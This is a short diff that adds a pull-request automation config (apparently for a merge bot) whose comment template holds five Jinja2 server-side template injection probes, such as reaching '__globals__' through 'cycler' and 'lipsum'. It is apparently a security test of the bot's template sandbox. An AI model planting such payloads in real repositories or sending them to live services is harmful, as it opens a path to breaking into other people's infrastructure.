@@ -1,0 +1,12 @@
+pull_request_rules:
+  - name: "SSTI sandbox test"
+    conditions:
+      - base=main
+    actions:
+      comment:
+        message: |
+          Test 1: {{ ''.__class__ }}
+          Test 2: {{ cycler.__init__.__globals__ }}
+          Test 3: {{ joiner.__init__.__globals__ }}
+          Test 4: {{ lipsum.__globals__ }}
+          Test 5: {{ namespace.__init__.__globals__ }}
